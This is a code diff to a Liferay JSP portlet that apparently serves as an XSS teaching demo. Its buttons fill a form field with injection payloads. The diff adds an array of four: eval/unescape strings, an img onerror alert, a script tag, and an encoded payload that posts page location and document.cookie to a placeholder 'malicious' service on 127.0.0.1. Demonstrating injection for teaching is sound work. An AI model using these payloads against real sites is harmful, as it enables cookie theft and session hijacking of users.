@@ -27,10 +27,10 @@ String lastName = GetterUtil.getString(renderRequest.getAttribute("lastName"));
 
 	<aui:button-row>
 		<% 
-		for (int inj = 0 ; inj < 3; inj++) {
+		for (int i = 0 ; i < 4; i++) {
 		%>
-			<aui:a href="#" cssClass="btn btn-danger btn-default" label="<%= "xss-injection-demo-" + (1+inj) %>" 
-				onclick="<%= "xssInjectionSuggestions(" + inj + ")" %>" />
+			<aui:a href="#" cssClass="btn btn-danger btn-default" label="<%= "xss-injection-demo-" + (1+i) %>" 
+				onclick="<%= "xssInjectionSuggestions(" + i +")" %>" />
 		<%
 		}
 		%>
@@ -43,19 +43,14 @@ String lastName = GetterUtil.getString(renderRequest.getAttribute("lastName"));
 	var lastNameField = $("#<portlet:namespace/>lastName");
 	console.log("firstName: " + firstName);
 	console.log("lastName: " + lastName);
-
-	
-	function xssInjectionSuggestions(injIndex) {
+	var suggestions = [
+		"'+eval(unescape(\"alert%28document.cookie%29\"))+'",
+		"< img src=# onerror=javascript:alert(String.fromCharCode(88,83,83)) >< /img >",
+		"< script > alert('remove-spaces-and-see-what-happens-after-submit') < / script >",
+		"'+eval(unescape(\"var%20url%20%3D%20%22http%3A//127.0.0.1/malicious/service%22%3B%20%24.post%28url%2CJSON.stringify%28%7B%22location%22%3A%20window.location%2C%20%22cookies%22%20%3A%20document.cookie%7D%29%29\"))+'"
+	];
+	function xssInjectionSuggestions(index) {
 		event.preventDefault();
-		injIndex = (injIndex === undefined ? 0 : injIndex % 3);
-		var suggestion = "";
-		if (injIndex == 0) {
-			suggestion = "'+eval(unescape(\"alert%28document.cookie%29\"))+'";
-		} else if (injIndex == 1) {
-			suggestion = "'+eval(unescape(\"var%20x%3D10%3B%20var%20y%3D10%3B%20alert%28%27x*y%3D%27%20+%20x*y%29\"))+'";
-		} else if (injIndex == 2) {
-			suggestion = "< script > alert('remove-spaces-and-see-what-happens-after-submit') < / script >";
-		}
-		lastNameField.val(suggestion);
+		lastNameField.val(suggestions[index]);
 	}
 </aui:script>
